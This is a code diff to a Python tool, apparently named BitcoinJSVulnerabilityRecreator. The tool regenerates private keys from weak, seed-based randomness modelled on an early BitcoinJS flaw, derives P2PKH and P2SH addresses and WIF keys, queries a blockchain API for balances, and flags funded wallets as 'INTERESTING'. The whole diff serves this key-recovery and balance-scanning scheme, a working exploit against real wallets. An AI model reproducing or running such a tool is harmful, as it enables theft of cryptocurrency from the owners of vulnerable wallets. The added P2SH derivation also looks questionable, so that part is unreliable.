@@ -62,32 +62,33 @@ class BitcoinJSVulnerabilityRecreator:
 
         return base58.b58encode(final_key).decode()
 
-    def private_key_to_address(self, private_key: bytes, compressed: bool = True) -> str:
-        """Convert private key to Bitcoin address"""
-        # Generate public key
+    def get_public_key(self, private_key: bytes, compressed: bool = True) -> bytes:
+        """Generate public key from private key"""
         sk = ecdsa.SigningKey.from_string(private_key, curve=self.secp256k1)
         vk = sk.get_verifying_key()
 
         if compressed:
-            # Compressed public key format
+            # Compressed public key format (33 bytes)
             x = vk.pubkey.point.x()
             y = vk.pubkey.point.y()
             if y % 2 == 0:
-                public_key = b'\x02' + x.to_bytes(32, 'big')
+                return b'\x02' + x.to_bytes(32, 'big')
             else:
-                public_key = b'\x03' + x.to_bytes(32, 'big')
+                return b'\x03' + x.to_bytes(32, 'big')
         else:
-            # Uncompressed public key format
-            public_key = b'\x04' + vk.to_string()
+            # Uncompressed public key format (65 bytes)
+            return b'\x04' + vk.to_string()
 
-        # Hash160 (SHA256 then RIPEMD160)
-        sha256_hash = hashlib.sha256(public_key).digest()
+    def hash160(self, data: bytes) -> bytes:
+        """Perform HASH160 (SHA256 then RIPEMD160)"""
+        sha256_hash = hashlib.sha256(data).digest()
         ripemd160 = hashlib.new('ripemd160')
         ripemd160.update(sha256_hash)
-        hash160 = ripemd160.digest()
+        return ripemd160.digest()
 
-        # Add version byte (0x00 for P2PKH)
-        versioned_hash = b'\x00' + hash160
+    def create_address(self, hash160_result: bytes, version_byte: bytes) -> str:
+        """Create Bitcoin address from hash160 and version byte"""
+        versioned_hash = version_byte + hash160_result
 
         # Double SHA256 for checksum
         checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]
@@ -95,6 +96,38 @@ class BitcoinJSVulnerabilityRecreator:
         # Final address
         address_bytes = versioned_hash + checksum
         return base58.b58encode(address_bytes).decode()
+
+    def private_key_to_p2pkh_address(self, private_key: bytes, compressed: bool = True) -> str:
+        """Convert private key to P2PKH address (starts with '1')"""
+        public_key = self.get_public_key(private_key, compressed)
+        hash160_result = self.hash160(public_key)
+        return self.create_address(hash160_result, b'\x00')
+
+    def private_key_to_p2sh_address(self, private_key: bytes, compressed: bool = True) -> str:
+        """Convert private key to P2SH address (starts with '3')
+        Note: P2SH was introduced April 1, 2012 - end of vulnerable period"""
+        public_key = self.get_public_key(private_key, compressed)
+
+        # Create a simple P2PKH script
+        pubkey_hash = self.hash160(public_key)
+        script = b'\x76\xa9\x14' + pubkey_hash + b'\x88\xac'  # OP_DUP OP_HASH160 <pubkey_hash> OP_EQUALVERIFY OP_CHECKSIG
+
+        script_hash = self.hash160(script)
+        return self.create_address(script_hash, b'\x05')
+
+    def private_key_to_all_address_formats(self, private_key: bytes) -> dict:
+        """Generate all possible address formats for a given private key"""
+        addresses = {}
+
+        # P2PKH addresses (available throughout 2011-2012)
+        addresses['p2pkh_compressed'] = self.private_key_to_p2pkh_address(private_key, compressed=True)
+        addresses['p2pkh_uncompressed'] = self.private_key_to_p2pkh_address(private_key, compressed=False)
+
+        # P2SH addresses (available from April 2012 onwards)
+        addresses['p2sh_compressed'] = self.private_key_to_p2sh_address(private_key, compressed=True)
+        addresses['p2sh_uncompressed'] = self.private_key_to_p2sh_address(private_key, compressed=False)
+
+        return addresses
 
     def check_address_balance(self, address: str) -> Dict:
         """Check Bitcoin address balance and transaction count using blockchain API"""
@@ -125,11 +158,10 @@ class BitcoinJSVulnerabilityRecreator:
             weak_random = self.simulate_weak_random(seed_value)
             private_key = self.generate_private_key_from_weak_random(weak_random)
 
-            # Generate both compressed and uncompressed addresses
-            # (BitcoinJS supported both formats)
-            compressed_address = self.private_key_to_address(private_key, compressed=True)
-            uncompressed_address = self.private_key_to_address(private_key, compressed=False)
+            # Generate all possible address formats from this private key
+            addresses = self.private_key_to_all_address_formats(private_key)
 
+            # Generate WIF formats
             wif_compressed = self.private_key_to_wif(private_key, compressed=True)
             wif_uncompressed = self.private_key_to_wif(private_key, compressed=False)
 
@@ -139,8 +171,7 @@ class BitcoinJSVulnerabilityRecreator:
                 'private_key_hex': private_key.hex(),
                 'wif_compressed': wif_compressed,
                 'wif_uncompressed': wif_uncompressed,
-                'address_compressed': compressed_address,
-                'address_uncompressed': uncompressed_address
+                **addresses  # Unpack all address formats
             }
 
         except Exception as e:
@@ -174,26 +205,29 @@ class BitcoinJSVulnerabilityRecreator:
             results.append(wallet)
 
             if check_blockchain:
-                # Check both compressed and uncompressed addresses
-                for addr_type in ['compressed', 'uncompressed']:
-                    address = wallet[f'address_{addr_type}']
-                    balance_info = self.check_address_balance(address)
+                # Check all address formats
+                address_types = ['p2pkh_compressed', 'p2pkh_uncompressed', 'p2sh_compressed', 'p2sh_uncompressed']
 
-                    wallet[f'blockchain_info_{addr_type}'] = balance_info
+                for addr_type in address_types:
+                    if addr_type in wallet:
+                        address = wallet[addr_type]
+                        balance_info = self.check_address_balance(address)
 
-                    # If wallet has any activity, mark as interesting
-                    if ('balance' in balance_info and balance_info['balance'] > 0) or \
-                            ('total_received' in balance_info and balance_info['total_received'] > 0):
-                        interesting_wallets.append({
-                            'wallet': wallet,
-                            'address_type': addr_type,
-                            'balance_info': balance_info
-                        })
-                        print(f"🔍 INTERESTING: Seed {seed} ({addr_type})")
-                        print(f"   Address: {address}")
-                        print(f"   Balance: {balance_info.get('balance', 0)} sats")
-                        print(f"   Total received: {balance_info.get('total_received', 0)} sats")
-                        print(f"   Transactions: {balance_info.get('n_tx', 0)}")
+                        wallet[f'blockchain_info_{addr_type}'] = balance_info
+
+                        # If wallet has any activity, mark as interesting
+                        if ('balance' in balance_info and balance_info['balance'] > 0) or \
+                                ('total_received' in balance_info and balance_info['total_received'] > 0):
+                            interesting_wallets.append({
+                                'wallet': wallet,
+                                'address_type': addr_type,
+                                'balance_info': balance_info
+                            })
+                            print(f"🔍 INTERESTING: Seed {seed} ({addr_type})")
+                            print(f"   Address: {address}")
+                            print(f"   Balance: {balance_info.get('balance', 0)} sats")
+                            print(f"   Total received: {balance_info.get('total_received', 0)} sats")
+                            print(f"   Transactions: {balance_info.get('n_tx', 0)}")
 
                 # Rate limiting
                 time.sleep(delay)
@@ -230,8 +264,17 @@ def main():
         wallet = recreator.generate_vulnerable_wallet(seed)
         print(f"\nSeed {seed}:")
         print(f"  Private Key: {wallet['private_key_hex']}")
-        print(f"  Address (compressed): {wallet['address_compressed']}")
-        print(f"  Address (uncompressed): {wallet['address_uncompressed']}")
+        print(f"  P2PKH (compressed):   {wallet['p2pkh_compressed']}")
+        print(f"  P2PKH (uncompressed): {wallet['p2pkh_uncompressed']}")
+        print(f"  P2SH (compressed):    {wallet['p2sh_compressed']}")
+        print(f"  P2SH (uncompressed):  {wallet['p2sh_uncompressed']}")
+
+    print("\n📝 Address Format Timeline:")
+    print("  • P2PKH (starts with '1'): Available throughout 2011-2012 vulnerable period")
+    print("  • P2SH (starts with '3'):  Available from April 1, 2012 onwards")
+    print("  • Each private key generates 4 different addresses!")
+    print("  • Most vulnerable period: May 2011 - March 2012 (P2PKH only)")
+    print("  • Late vulnerable period: April 2012+ (P2PKH + P2SH)")
 
     # Uncomment below to scan a range and check blockchain
     # WARNING: This will make many API calls and may take time
